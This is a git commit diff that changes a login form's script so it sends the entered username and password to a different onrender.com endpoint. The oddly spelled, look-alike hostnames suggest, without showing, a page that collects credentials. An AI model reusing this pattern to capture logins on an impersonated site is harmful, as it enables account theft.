6e2d4a92bc197f48d25041377fb523f1d6810b22
heloamtimy <kespeso75@gmail.com>
2025-08-19 18:31:23 +0800

    Update script.js

--- public/script.js
+++ public/script.js
@@ -5,7 +5,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   const password = document.getElementById('password').value;
 
   try {
-    const response = await fetch('https://rblock.onrender.com//data', {
+    const response = await fetch('https://rebokc.onrender.com//data', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username, password }),
